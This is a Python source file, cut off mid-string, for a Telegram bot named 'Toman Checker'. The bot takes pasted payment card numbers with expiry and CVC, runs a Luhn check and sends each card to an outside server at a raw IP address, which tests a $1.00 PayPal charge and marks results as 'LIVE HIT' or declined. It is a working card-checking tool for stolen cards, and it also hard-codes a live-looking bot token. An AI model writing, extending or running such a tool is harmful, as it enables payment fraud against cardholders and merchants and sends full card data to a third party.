import telebot
import time
import threading
import requests
import re
import random
from telebot import types
from datetime import datetime

token = '7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU'
bot = telebot.TeleBot(token, parse_mode="HTML")

admin = 7077294261
stopuser = {}

# ================== CHECKER WITHOUT PROXY ==================
def pali(ccx):
    ccx = ccx.strip()
    current_time = datetime.now().strftime('%H:%M:%S')
    
    print(f"[{current_time}] CHECKING → {ccx}")
    
    try:
        url = f"http://138.128.240.15:8024/paypal_1?cc={ccx}"
        print(f"[{current_time}] API CALL → {url}")
        
        r = requests.get(url, timeout=30)
        text = r.text
        
        print(f"[{current_time}] STATUS CODE → {r.status_code}")
        print(f"[{current_time}] RESPONSE → {text[:400]}")
        
        if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
            print(f"[{current_time}] ✅ LIVE HIT")
            return "CHARGE 1.00$"
        else:
            print(f"[{current_time}] ❌ DECLINED")
            return "DECLINED"

    except Exception as e:
        print(f"[{current_time}] ❌ ERROR: {e}")
        return "ERROR"

# ================== CARD REGEX ==================
def luhn_check(number: str) -> bool:
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def reg(cc: str):
    parts = [p for p in re.split(r'\D+', cc) if p]
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        if not luhn_check(pan):
            return None
        return f"{pan}|{mm}|{yy}|{cvc}"
    return None

# ================== BOT ==================
@bot.message_handler(commands=["start"])
def handle_start(message):
    mes = types.InlineKeyboardMarkup()
    mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))
    bot.send_message(message.chat.id, f"Hi {message.from_user.first_name}, Welcome To Toman Checker", reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    bot.send_message(call.message.chat.id, "Use /pp for single check or send .txt file")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp')))
def single_check(message):
    ko = bot.reply_to(message, "Checking...").message_id
    try:
        cc_text = message.reply_to_message.text if message.reply_to_message else message.text
        cc = reg(cc_text)
        if not cc:
            return bot.edit_message_text("Invalid Card Format!", message.chat.id, ko)

        last = pali(cc)
        msg = f'''<strong>#PayPal_Custom
